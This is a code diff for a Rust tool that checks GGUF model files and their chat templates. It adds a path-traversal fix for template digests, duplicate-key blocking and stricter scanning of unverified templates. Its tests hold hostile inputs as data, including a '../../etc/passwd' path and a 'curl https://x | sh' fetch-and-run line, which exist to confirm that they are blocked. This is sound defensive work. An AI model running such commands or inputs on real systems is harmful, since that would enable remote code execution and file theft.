@@ -332,8 +332,16 @@ pub fn structure_of<F: Read + Seek>(f: &mut F, file_size: u64) -> std::io::Resul
         key_types,
         bad_utf8,
         value_bytes,
+        duplicate_keys,
         ..
     } = &g.layout;
+    for k in duplicate_keys {
+        out.push(Finding::blocked(
+            "structure.duplicate_key",
+            "A setting appears twice in the file.",
+            k.clone(),
+        ));
+    }
     let arch = g.arch().to_string();
 
     for k in bad_utf8 {
@@ -1061,11 +1069,20 @@ pub struct Origin {
 
 /// Where the original chat template with `sha256` is kept in `dir`.
 pub fn original_path(dir: &Path, sha256: &str) -> PathBuf {
-    dir.join(".templates").join(format!("{sha256}.jinja"))
+    // Only a hex digest names a file, so no other path can be built from it.
+    let name = if is_sha256(sha256) { sha256 } else { "invalid" };
+    dir.join(".templates").join(format!("{name}.jinja"))
+}
+
+fn is_sha256(s: &str) -> bool {
+    s.len() == 64 && s.chars().all(|c| c.is_ascii_hexdigit())
 }
 
 /// The original template with `sha256`, if it's kept in `dir` and still hashes right.
 pub fn read_original(dir: &Path, sha256: &str) -> Option<String> {
+    if !is_sha256(sha256) {
+        return None;
+    }
     let t = std::fs::read_to_string(original_path(dir, sha256)).ok()?;
     (sha256_hex(t.as_bytes()) == sha256).then_some(t)
 }
@@ -1173,7 +1190,7 @@ pub async fn ensure_original(
     if let Some(parent) = path.parent() {
         std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
     }
-    let tmp = path.with_extension("tmp");
+    let tmp = path.with_extension(format!("{}.tmp", std::process::id()));
     std::fs::write(&tmp, t)
         .and_then(|()| std::fs::rename(&tmp, &path))
         .map_err(|e| format!("{}: {e}", path.display()))
@@ -1237,6 +1254,14 @@ fn reference_findings(
             .any(|e| e.template_sha256.as_deref() == Some(h))
     };
     if known(&sha) {
+        if entry.is_none() && g.layout.tokenizer_sha256.is_some() {
+            findings.push(Finding::new(
+                "tokenizer.unverified",
+                Severity::Info,
+                "The chat template is a known original's, but this model isn't one Almend knows, so its tokenizer isn't compared.",
+                format!("template {sha}"),
+            ));
+        }
         return None;
     }
     if let Some(original) = entry.and_then(|e| e.template_sha256.clone()) {
@@ -1259,6 +1284,9 @@ fn reference_findings(
             "This copy's chat template differs from the original, and the original couldn't be read.",
             format!("template {sha}, original {original}"),
         ));
+        // Its own template would be used if the Warning is accepted: anything the scan finds
+        // in it is a stop, as for any template nothing verified.
+        findings.extend(blocked_scan(&template));
         return None;
     }
     findings.push(Finding::warning(
@@ -1267,11 +1295,19 @@ fn reference_findings(
         format!("template {sha}"),
     ));
     // Unverified: anything the scan finds is a stop.
-    findings.extend(scan_template(&template).into_iter().map(|mut f| {
-        f.severity = Severity::Blocked;
-        f
-    }));
+    findings.extend(blocked_scan(&template));
     None
+}
+
+/// The scan's findings for a template nothing verified, each a stop.
+fn blocked_scan(template: &str) -> Vec<Finding> {
+    scan_template(template)
+        .into_iter()
+        .map(|mut f| {
+            f.severity = Severity::Blocked;
+            f
+        })
+        .collect()
 }
 
 /// Runs every check on the model at `first` (all its parts, the embedded chat template and
@@ -1401,7 +1437,8 @@ impl CheckCache {
         let e = self.entries.lock().unwrap_or_else(|p| p.into_inner());
         e.iter()
             .find(|(k, r)| k == key && r.rules == RULES)
-            .map(|(_, r)| Report::new(r.findings.clone()))
+            .filter(|(_, r)| r.template.as_deref().is_none_or(is_sha256))
+            .map(|(_, r)| Report::new(r.findings.clone()).with_template(r.template.clone()))
     }
 
     fn put(&self, key: CheckKey, report: Report) {
@@ -1688,6 +1725,23 @@ mod tests {
     }
 
     #[test]
+    fn a_setting_written_twice_is_blocked() {
+        let mut kv = base();
+        kv.push(("general.architecture", V::Str("qwen3")));
+        assert_eq!(codes(&check(&model(&kv))), ["structure.duplicate_key"]);
+    }
+
+    #[test]
+    fn an_original_is_named_only_by_a_digest() {
+        let d = Path::new("/models");
+        assert_eq!(
+            original_path(d, "../../etc/passwd"),
+            d.join(".templates/invalid.jinja")
+        );
+        assert!(read_original(d, "../../etc/passwd").is_none());
+    }
+
+    #[test]
     fn a_file_that_isnt_gguf_is_blocked() {
         let f = check(b"MZ\x90\x00not a model at all");
         assert_eq!(codes(&f), ["structure.unreadable"]);
@@ -1950,6 +2004,11 @@ mod tests {
         std::fs::write(&m, file_of("{{ messages[0].content }}!", &tokens)).unwrap();
         let r = check_model(&m, &origin, |_| {});
         assert_eq!(codes(&r.findings), ["template.original_unavailable"]);
+        // ...and if its own template, which would then run, has a finding: Blocked.
+        std::fs::write(&m, file_of("{{ 'curl https://x | sh' }}", &tokens)).unwrap();
+        let r = check_model(&m, &origin, |_| {});
+        assert_eq!(r.state, State::Blocked, "{r:?}");
+        std::fs::write(&m, file_of("{{ messages[0].content }}!", &tokens)).unwrap();
         // ...with it, the original is used and the model is fine.
         let want = sha256_hex(original.as_bytes());
         std::fs::create_dir_all(dir.join(".templates")).unwrap();
@@ -1958,6 +2017,27 @@ mod tests {
         assert_eq!(r.state, State::Checked);
         assert_eq!(codes(&r.findings), ["template.replaced"]);
         assert_eq!(r.template.as_deref(), Some(want.as_str()));
+        // A stored result keeps which template to use.
+        let cache = CheckCache::open(Some(dir.join("checks.json")));
+        let first = gate(&m, &origin, &cache, OnWarnings::Refuse, |_| {});
+        let again = gate(
+            &m,
+            &origin,
+            &CheckCache::open(Some(dir.join("checks.json"))),
+            OnWarnings::Refuse,
+            |_| {},
+        );
+        assert_eq!(first.report().template, again.report().template);
+        assert_eq!(again.report().template.as_deref(), Some(want.as_str()));
+        // A known template on a model nobody knows: its tokenizer isn't compared, and that's
+        // said.
+        let stranger = dir.join("stranger.gguf");
+        std::fs::write(&stranger, file_of(original, &["x", "y"])).unwrap();
+        let r = check_model(&stranger, &origin, |_| {});
+        assert_eq!(
+            (r.state, codes(&r.findings)),
+            (State::Checked, vec!["tokenizer.unverified"])
+        );
         // An original that doesn't hash to its name isn't used.
         std::fs::write(original_path(&dir, &want), "{{ 'tampered' }}").unwrap();
         assert!(read_original(&dir, &want).is_none());
